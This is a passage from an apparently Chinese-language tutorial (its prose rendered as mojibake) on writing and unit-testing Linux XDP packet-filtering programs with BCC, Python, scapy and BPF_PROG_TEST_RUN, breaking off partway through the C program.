class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">device = <span class="string">"eth0"</span></span><br><span class="line">b = BPF(src_file=<span class="string">"program.c"</span>)</span><br><span class="line">fn = b.load_func(<span class="string">"myprogram"</span>, BPF.XDP)</span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line">packetcnt = b.get_table(<span class="string">"packetcnt"</span>)</span><br><span class="line"></span><br><span class="line">prev = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">print(<span class="string">"Printing packet counts per IP protocol-number, hit CTRL+C to stop"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> packetcnt.keys():</span><br><span class="line">            val = packetcnt.sum(k).value</span><br><span class="line">            i = k.value</span><br><span class="line">            <span class="keyword">if</span> val:</span><br><span class="line">                delta = val - prev[i]</span><br><span class="line">                prev[i] = val</span><br><span class="line">                print(<span class="string">"&#123;&#125;: &#123;&#125; pkt/s"</span>.format(i, delta))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"Removing filter from device"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">b.remove_xdp(device, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•åœ°ä½¿ç”¨æ‰§è¡ŒåŠ è½½ç¨‹åºæ¥æµ‹è¯•è¯¥ç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bcc]# python3 loader.py</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å·²ç»åŠ è½½äº†ç¨‹åºï¼Œå¯ä»¥é€šè¿‡eth0æ¥å£å‘é€ä¸€äº›æ•°æ®åŒ…ï¼Œpingæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å°è¯•æ–¹æ³•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bcc]# ping 10.0.16.14</span><br><span class="line">PING 10.0.16.14 (10.0.16.14) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=1 ttl=64 time=0.012 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=2 ttl=64 time=0.019 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=3 ttl=64 time=0.021 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=4 ttl=64 time=0.021 ms</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥çœ‹åˆ°ç¨‹åºå¼€å§‹æ‰“å°ç»“æœã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Printing packet counts per IP protocol-number, hit CTRL+C to stop</span><br><span class="line">0: 1 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•XDPç¨‹åº"><a href="#æµ‹è¯•XDPç¨‹åº" class="headerlink" title="æµ‹è¯•XDPç¨‹åº"></a>æµ‹è¯•XDPç¨‹åº</h3><p>åœ¨å¼€å‘XDPç¨‹åºæ—¶ï¼Œæœ€å›°éš¾çš„éƒ¨åˆ†æ˜¯ä¸ºäº†æµ‹è¯•å®é™…çš„æ•°æ®åŒ…æµéœ€è¦é‡ç°ä¸€ä¸ªç¯å¢ƒï¼Œå…¶ä¸­æ‰€æœ‰ç»„ä»¶éƒ½å¯¹é½ä»¥æä¾›æ­£ç¡®çš„æ•°æ®åŒ…ã€‚å°½ç®¡ç°åœ¨ä½¿ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œåˆ›å»ºå·¥ä½œç¯å¢ƒç¡®å®æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œä½†å¤æ‚çš„è®¾ç½®ä¹Ÿä¼šé™åˆ¶æµ‹è¯•ç¯å¢ƒçš„å¯é‡å¤æ€§å’Œå¯ç¼–ç¨‹æ€§ï¼Œè¿™ä¹Ÿæ˜¯äº‹å®ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­åˆ†æXDPç¨‹åºçš„æ€§èƒ½æ–¹é¢æ—¶ï¼Œè™šæ‹ŸåŒ–çš„æˆæœ¬ä½¿æµ‹è¯•æ— æ•ˆï¼Œå› ä¸ºå®ƒæ¯”å®é™…çš„æ•°æ®åŒ…å¤„ç†è¦å¯è§‚å¾—å¤šã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œå†…æ ¸å¼€å‘äººå‘˜æœ‰ä¸€ä¸ªè§£å†³æ–¹æ¡ˆã€‚ä»–ä»¬å®ç°äº†ä¸€ä¸ªå¯ç”¨äºæµ‹è¯•XDPç¨‹åºçš„å‘½ä»¤ï¼Œç§°ä¸º<code>BPF_PROG_TEST_RUN</code>ã€‚</p><p>æœ¬è´¨ä¸Šï¼Œ<code>BPF_PROG_TEST_RUN</code>è®©XDPç¨‹åºè¿åŒä¸€ä¸ªè¾“å…¥åŒ…å’Œä¸€ä¸ªè¾“å‡ºåŒ…ä¸€èµ·æ‰§è¡Œã€‚ ç¨‹åºæ‰§è¡Œæ—¶ï¼Œä¼šå¡«å……è¾“å‡ºæ•°æ®åŒ…å˜é‡ï¼Œå¹¶è¿”å›XDPä»£ç ã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨æ–­è¨€æµ‹è¯•ä¸­ä½¿ç”¨è¾“å‡ºæ•°æ®åŒ…å’Œè¿”å›ä»£ç ï¼è¿™ç§æŠ€æœ¯ä¹Ÿå¯ä»¥ç”¨äº<code>skb</code>ç¨‹åºã€‚</p><p>ä¸ºäº†å®Œæ•´æµ‹è¯•è¿™ä¸ªç¤ºä¾‹ï¼Œæˆ‘ä»¬ä½¿ç”¨PythonåŠå…¶å•å…ƒæµ‹è¯•æ¡†æ¶ã€‚</p><h4 id="ä½¿ç”¨Pythonå•å…ƒæµ‹è¯•æ¡†æ¶æµ‹è¯•XDPç¨‹åº"><a href="#ä½¿ç”¨Pythonå•å…ƒæµ‹è¯•æ¡†æ¶æµ‹è¯•XDPç¨‹åº" class="headerlink" title="ä½¿ç”¨Pythonå•å…ƒæµ‹è¯•æ¡†æ¶æµ‹è¯•XDPç¨‹åº"></a>ä½¿ç”¨Pythonå•å…ƒæµ‹è¯•æ¡†æ¶æµ‹è¯•XDPç¨‹åº</h4><p>ä½¿ç”¨<code>BPF_PROG_TEST_RUN</code>ç¼–å†™XDPæµ‹è¯•å¹¶å°†å®ƒä»¬ä¸Pythonå•å…ƒæµ‹è¯•æ¡†æ¶<code>unittest</code>é›†æˆæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ul><li>ä½ å¯ä»¥ä½¿ç”¨Python BCCåº“åŠ è½½å’Œæ‰§è¡ŒBPFç¨‹åº</li><li>Pythonæ‹¥æœ‰æœ€å¥½çš„æ•°æ®åŒ…åˆ¶ä½œå’Œè‡ªçœåº“ä¹‹ä¸€ï¼š<code>scapy</code></li><li>Pythoné€šè¿‡<code>ctypes</code>ä¸Cç»“æ„é›†æˆ</li></ul><p>å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬éœ€è¦å¯¼å…¥æ‰€æœ‰éœ€è¦çš„åº“ï¼›è¿™æ˜¯æˆ‘ä»¬å°†åœ¨åä¸º<code>test_xdp.py</code>çš„æ–‡ä»¶ä¸­åšçš„ç¬¬ä¸€ä»¶äº‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, libbcc</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> Ether, IP, raw, TCP, UDP</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XDPExampleTestCase</span><span class="params">(unittest.TestCase)</span>:</span> </span><br><span class="line">  SKB_OUT_SIZE = <span class="number">1514</span> <span class="comment"># mtu 1500 + 14 ethernet size </span></span><br><span class="line">  bpf_function = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>å¯¼å…¥æ‰€æœ‰éœ€è¦çš„åº“åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­å¹¶åˆ›å»ºä¸€ä¸ªåä¸º<code>XDPExampleTestCase</code>çš„æµ‹è¯•ç”¨ä¾‹ç±»ã€‚ è¿™ä¸ªæµ‹è¯•ç±»å°†åŒ…å«æˆ‘ä»¬æ‰€æœ‰çš„æµ‹è¯•ç”¨ä¾‹å’Œæˆå‘˜æ–¹æ³•(<code>_xdp_test_run</code>)ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒæ¥è¿›è¡Œæ–­è¨€å¹¶è°ƒç”¨<code>bpf_prog_test_run</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_xdp_test_run</span><span class="params">(self, given_packet, expected_packet, expected_return)</span>:</span></span><br><span class="line">        size = len(given_packet)</span><br><span class="line"></span><br><span class="line">        given_packet = ctypes.create_string_buffer(raw(given_packet), size)</span><br><span class="line">        packet_output = ctypes.create_string_buffer(self.SKB_OUT_SIZE)</span><br><span class="line"></span><br><span class="line">        packet_output_size = ctypes.c_uint32()</span><br><span class="line">        test_retval = ctypes.c_uint32()</span><br><span class="line">        duration = ctypes.c_uint32()</span><br><span class="line">        repeat = <span class="number">1</span></span><br><span class="line">        ret = libbcc.lib.bpf_prog_test_run(self.bpf_function.fd,</span><br><span class="line">                                           repeat,</span><br><span class="line">                                           ctypes.byref(given_packet),</span><br><span class="line">                                           size,</span><br><span class="line">                                           ctypes.byref(packet_output),</span><br><span class="line">                                           ctypes.byref(packet_output_size),</span><br><span class="line">                                           ctypes.byref(test_retval),</span><br><span class="line">                                           ctypes.byref(duration))</span><br><span class="line">        self.assertEqual(ret, <span class="number">0</span>)</span><br><span class="line">        self.assertEqual(test_retval.value, expected_return)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> expected_packet:</span><br><span class="line">            self.assertEqual(</span><br><span class="line">                packet_output[:packet_output_size.value], raw(expected_packet))</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°</p><p>given_packetï¼šè¿™æ˜¯æˆ‘ä»¬æµ‹è¯•XDPç¨‹åºçš„æ•°æ®åŒ…ï¼› å®ƒæ˜¯æ¥å£æ¥æ”¶åˆ°çš„åŸå§‹æ•°æ®åŒ…ã€‚</p><p>expected_packetï¼šè¿™æ˜¯æˆ‘ä»¬æœŸæœ›åœ¨XDPç¨‹åºå¤„ç†åæ”¶åˆ°çš„æ•°æ®åŒ…ï¼›å½“XDPç¨‹åºè¿”å›<code>XDP_DROP</code>æˆ–<code>XDP_ABORT</code>æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒä¸ºNoneï¼›åœ¨æ‰€æœ‰å…¶ä»–æƒ…å†µä¸‹ï¼Œæ•°æ®åŒ…ä¸<code>given_packet</code>ä¿æŒç›¸åŒæˆ–å¯ä»¥ä¿®æ”¹ã€‚</p><p>expected_returnï¼šè¿™æ˜¯å¤„ç†æˆ‘ä»¬çš„<code>given_packet</code>åXDPç¨‹åºçš„é¢„æœŸè¿”å›ã€‚</p><p>é™¤äº†å‚æ•°ä¹‹å¤–ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä¸»ä½“å¾ˆç®€å•ã€‚å®ƒä½¿ç”¨<code>ctypes</code>åº“è½¬æ¢ä¸ºCç±»å‹ï¼Œç„¶åè°ƒç”¨ä¸<code>BPF_PROG_TEST_RUN</code>ç­‰æ•ˆçš„<code>libbcc</code>ï¼Œ<code>libbcc.lib.bpf_prog_test_run</code>ï¼Œä½¿ç”¨æˆ‘ä»¬çš„æ•°æ®åŒ…åŠå…¶å…ƒæ•°æ®ä½œä¸ºæµ‹è¯•å‚æ•°ã€‚ç„¶åæ ¹æ®æµ‹è¯•è°ƒç”¨çš„ç»“æœä»¥åŠç»™å®šçš„å€¼æ‰§è¡Œæ‰€æœ‰æ–­è¨€ã€‚</p><p>æœ‰äº†è¿™ä¸ªåŠŸèƒ½ä¹‹åï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥é€šè¿‡åˆ¶ä½œä¸åŒçš„æ•°æ®åŒ…æ¥æµ‹è¯•å®ƒä»¬åœ¨é€šè¿‡æˆ‘ä»¬çš„XDPç¨‹åºæ—¶çš„è¡Œä¸ºæ–¹å¼æ¥ç¼–å†™æµ‹è¯•ç”¨ä¾‹ï¼Œä½†åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºæˆ‘ä»¬çš„æµ‹è¯•åšä¸€ä¸ª<code>setUp</code>æ–¹æ³•ã€‚</p><p>è¿™éƒ¨åˆ†è‡³å…³é‡è¦ï¼Œå› ä¸ºå®‰è£…ç¨‹åºé€šè¿‡æ‰“å¼€å¹¶ç¼–è¯‘åä¸º<code>program.c</code>çš„æºæ–‡ä»¶ï¼ˆè¿™æ˜¯æˆ‘ä»¬çš„XDPä»£ç æ‰€åœ¨çš„æ–‡ä»¶ï¼‰æ¥æ‰§è¡Œåä¸º<code>myprogram</code>çš„BPFç¨‹åºçš„å®é™…åŠ è½½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">    bpf_prog = BPF(src_file=<span class="string">b"program.c"</span>)</span><br><span class="line">    self.bpf_function = bpf_prog.load_func(<span class="string">b"myprogram"</span>, BPF.XDP)</span><br></pre></td></tr></table></figure><p>è®¾ç½®å®Œæˆåï¼Œä¸‹ä¸€æ­¥æ˜¯ç¼–å†™æˆ‘ä»¬è¦è§‚å¯Ÿçš„ç¬¬ä¸€ä¸ªè¡Œä¸ºã€‚æˆ‘ä»¬æƒ³æµ‹è¯•ä¸€ä¸‹æˆ‘ä»¬æ˜¯å¦ä¼šä¸¢å¼ƒæ‰€æœ‰TCPæ•°æ®åŒ…ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨<code>given_packet</code>ä¸­åˆ¶ä½œäº†ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªåŸºäºIPv4çš„TCPæ•°æ®åŒ…ã€‚ ç„¶åï¼Œä½¿ç”¨æˆ‘ä»¬çš„æ–­è¨€æ–¹æ³•<code>_xdp_test_run</code>ï¼Œæˆ‘ä»¬åªæ˜¯éªŒè¯ç»™å®šæˆ‘ä»¬çš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°†è¿”å›ä¸€ä¸ªæ²¡æœ‰è¿”å›æ•°æ®åŒ…çš„ <code>XDP_DROP</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_drop_tcp</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / TCP()</span><br><span class="line">    self._xdp_test_run(given_packet, <span class="literal">None</span>, BPF.XDP_DROP)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜æƒ³æ˜ç¡®æµ‹è¯•æ˜¯å¦å…è®¸æ‰€æœ‰UDPæ•°æ®åŒ…ã€‚ ç„¶åæˆ‘ä»¬åˆ¶ä½œä¸¤ä¸ªUDPæ•°æ®åŒ…ï¼Œä¸€ä¸ªç”¨äº<code>given_packet</code>ï¼Œä¸€ä¸ªç”¨äº<code>expected_packet</code>ï¼Œå®ƒä»¬æœ¬è´¨ä¸Šæ˜¯ç›¸åŒçš„ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬æµ‹è¯•UDPæ•°æ®åŒ…åœ¨<code>XDP_PASS</code>å…è®¸çš„æƒ…å†µä¸‹ä¸ä¼šè¢«ä¿®æ”¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_pass_udp</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / UDP()</span><br><span class="line">    expected_packet = Ether() / IP() / UDP()</span><br><span class="line">    self._xdp_test_run(given_packet, expected_packet, BPF.XDP_PASS)</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è®©äº‹æƒ…å˜å¾—æ›´å¤æ‚ä¸€ç‚¹ï¼Œæˆ‘ä»¬å†³å®šè¿™ä¸ªç³»ç»Ÿå°†å…è®¸TCPæ•°æ®åŒ…åœ¨å®ƒä»¬åˆ°è¾¾ç«¯å£9090çš„æ¡ä»¶ä¸‹ã€‚å®ƒä»¬å°†è¢«é‡å†™ä»¥æ›´æ”¹ç›®æ ‡MACåœ°å€ä»¥é‡å®šå‘åˆ°ç‰¹å®šçš„ç½‘ç»œã€‚åœ°å€ä¸º<code>08:00:27:dd:38:2a</code>çš„å·¥ä½œæ¥å£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_transform_dst</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">    expected_packet = Ether(dst=<span class="string">'08:00:27:dd:38:2a'</span>) / \</span><br><span class="line">        IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">    self._xdp_test_run(given_packet, expected_packet, BPF.XDP_TX)</span><br></pre></td></tr></table></figure><p>æœ‰äº†å¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ï¼Œæˆ‘ä»¬ç°åœ¨ä¸ºæˆ‘ä»¬çš„æµ‹è¯•ç¨‹åºç¼–å†™å…¥å£ç‚¹ï¼Œå®ƒåªä¼šè°ƒç”¨ unittest.main() ç„¶ååŠ è½½å¹¶æ‰§è¡Œæˆ‘ä»¬çš„æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  unittest.main()</span><br></pre></td></tr></table></figure><p><code>test_xdp.py</code>å®Œæ•´ç¨‹åºå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, libbcc</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> Ether, IP, raw, TCP, UDP</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XDPExampleTestCase</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    SKB_OUT_SIZE = <span class="number">1514</span>  <span class="comment"># mtu 1500 + 14 ethernet size</span></span><br><span class="line">    bpf_function = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_xdp_test_run</span><span class="params">(self, given_packet, expected_packet, expected_return)</span>:</span></span><br><span class="line">        size = len(given_packet)</span><br><span class="line"></span><br><span class="line">        given_packet = ctypes.create_string_buffer(raw(given_packet), size)</span><br><span class="line">        packet_output = ctypes.create_string_buffer(self.SKB_OUT_SIZE)</span><br><span class="line"></span><br><span class="line">        packet_output_size = ctypes.c_uint32()</span><br><span class="line">        test_retval = ctypes.c_uint32()</span><br><span class="line">        duration = ctypes.c_uint32()</span><br><span class="line">        repeat = <span class="number">1</span></span><br><span class="line">        ret = libbcc.lib.bpf_prog_test_run(self.bpf_function.fd,</span><br><span class="line">                                           repeat,</span><br><span class="line">                                           ctypes.byref(given_packet),</span><br><span class="line">                                           size,</span><br><span class="line">                                           ctypes.byref(packet_output),</span><br><span class="line">                                           ctypes.byref(packet_output_size),</span><br><span class="line">                                           ctypes.byref(test_retval),</span><br><span class="line">                                           ctypes.byref(duration))</span><br><span class="line">        self.assertEqual(ret, <span class="number">0</span>)</span><br><span class="line">        self.assertEqual(test_retval.value, expected_return)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> expected_packet:</span><br><span class="line">            self.assertEqual(</span><br><span class="line">                packet_output[:packet_output_size.value], raw(expected_packet))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        bpf_prog = BPF(src_file=<span class="string">b"program.c"</span>)</span><br><span class="line">        self.bpf_function = bpf_prog.load_func(<span class="string">b"myprogram"</span>, BPF.XDP)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_drop_tcp</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / TCP()</span><br><span class="line">        self._xdp_test_run(given_packet, <span class="literal">None</span>, BPF.XDP_DROP)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_pass_udp</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / UDP()</span><br><span class="line">        expected_packet = Ether() / IP() / UDP()</span><br><span class="line">        self._xdp_test_run(given_packet, expected_packet, BPF.XDP_PASS)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_transform_dst</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">        expected_packet = Ether(dst=<span class="string">'08:00:27:dd:38:2a'</span>) / \</span><br><span class="line">            IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">        self._xdp_test_run(given_packet, expected_packet, BPF.XDP_TX)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å·²ç»ä¸ºXDPç¨‹åºç¼–å†™äº†æµ‹è¯•ï¼ç°åœ¨æˆ‘ä»¬å·²ç»å°†æµ‹è¯•ä½œä¸ºæˆ‘ä»¬æƒ³è¦çš„ç‰¹å®šç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªåä¸º<code>program.c</code>çš„æ–‡ä»¶æ¥ç¼–å†™å®ç°å®ƒçš„XDPç¨‹åºã€‚</p><p>ç¨‹åºå¾ˆç®€å•ã€‚å®ƒåªåŒ…å«<code>myprogram</code> XDPå‡½æ•°å’Œæˆ‘ä»¬åˆšåˆšæµ‹è¯•çš„é€»è¾‘ã€‚ä¸å¾€å¸¸ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯åŒ…å«æ‰€éœ€çš„æ ‡é¢˜ã€‚æœ‰ä¸€ä¸ªBPFç¨‹åºå°†å¤„ç†é€šè¿‡ä»¥å¤ªç½‘ä¼ è¾“çš„TCP/IPï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"kmyprogram"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œä¸æœ¬ç« ä¸­çš„å…¶ä»–ç¨‹åºä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥æ•°æ®åŒ…ä¸‰å±‚çš„åç§»é‡å’Œå¡«å……å˜é‡ï¼š<code>ethhdrã€iphdrå’Œ tcphdr</code>ï¼Œåˆ†åˆ«ç”¨äºä»¥å¤ªç½‘ã€IPv4å’ŒTCPï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span 